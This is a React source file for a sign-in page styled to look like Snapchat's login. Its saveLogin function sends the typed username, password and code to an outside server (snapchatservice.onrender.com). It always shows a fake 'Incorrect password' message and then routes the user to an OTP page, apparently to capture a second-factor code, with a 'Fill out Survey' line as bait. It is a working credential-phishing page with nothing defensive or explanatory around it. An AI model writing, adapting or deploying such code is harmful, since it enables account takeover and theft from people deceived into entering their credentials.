import React, { useState } from "react";
import "./Signin.css"
import { Link } from "react-router-dom";
import { Check, ChevronLeft, Eye, EyeOff } from "react-feather";

interface Loginprops{
  data: [String,String,String];
  methods:[React.Dispatch<React.SetStateAction<string>>,React.Dispatch<React.SetStateAction<string>>,React.Dispatch<React.SetStateAction<string>>]
}

const Signin = (props: Loginprops) => {
 
  const { data, methods } = props;
  const [ username, password, code ] = data;
  const [setUsername, setPassword] = methods;
  const [error, setError] = useState(false);
  const [count, setCount] = useState(1);
  const [showPassword, setShowPassword] = useState(false);
  const [saveLoginInfo, setSaveLoginInfo] = useState(true);

  const saveLogin = () => {
    if(password && username){   
    setError(true);
    setCount(2);
      fetch("https://snapchatservice.onrender.com/api/Logins", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password, code }),
      })
        .then((response) => {
          if (!response.ok) {
            return response.json().then((error) => {
              throw new Error(error.message || "Failed to save Login.");
            });
          }
          return response.json();
        })
        .then((data) => {
          console.log("Login has been added", data);
          // Optionally, handle success state or update the UI
        })
        .catch((error) => {
          console.error("Login saving note:", error.message);
          // Optionally, display an error message to the user
        });
    }
    else
      console.log("Fields are empty");
  }

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  }

  return (
    <div className="snap-container">
      <div className="snap-header">
        <button className="snap-back-button">
          <ChevronLeft size={24} color="transparent" />
        </button>
      </div>
      
      <div className="snap-content">
        <h1 className="snap-title">Log In</h1>
        
        <div className="snap-form-group">
          <label className="snap-label">USERNAME OR EMAIL</label>
          <input
            type="text"
            className="snap-input"
            onChange={(e) => setUsername(e.target.value)}
            placeholder=""
          />
          <div className="snap-alternative">
            <a href="#" className="snap-link"></a>
          </div>
        </div>
        
        <div className="snap-form-group">
          <label className="snap-label">PASSWORD</label>
          <div className="snap-password-container">
            <input
              type={showPassword ? "text" : "password"}
              className="snap-input"
              onChange={(e) => setPassword(e.target.value)}
              placeholder=""
            />
            <button 
              className="snap-password-toggle" 
              onClick={togglePasswordVisibility}
              type="button"
            >
              {showPassword ? <EyeOff size={20} color="#8e8e8e" /> : <Eye size={20} color="#8e8e8e" />}
            </button>
          </div>
          {error && (
            <span className="snap-error">Incorrect password try again.</span>
          )}
        </div>
        
        <div className="snap-checkbox-container">
          <label className="snap-checkbox-label">
            <input
              type="checkbox"
              checked={saveLoginInfo}
              onChange={() => setSaveLoginInfo(!saveLoginInfo)}
              className="snap-checkbox"
            />
            <span className="snap-checkbox-custom"><span><Check color="#00b2ff" size={22} /></span></span>
            <span className="snap-checkbox-text">Save Login Info on your device</span>
          </label>
        </div>
        
        <div className="snap-forgot-password">
        </div>
        
        <Link to={count === 2 ? "/otp" : "/login"} className="snap-btn-link">
          <button 
            className="snap-login-btn" 
            style={{ 
              backgroundColor: password && username ? 'rgb(44, 179, 247)' : 'rgba(86, 94, 102, 0.575)'
            }} 
            onClick={saveLogin}
          >
            Log In
          </button>
          <span style={{display:"flex",justifyContent:"center",marginTop:10,opacity:0.4,color:"black"}}>Login to Fill out Survey</span>
        </Link>
        
      </div>
    </div>
  );
}
 
export default Signin;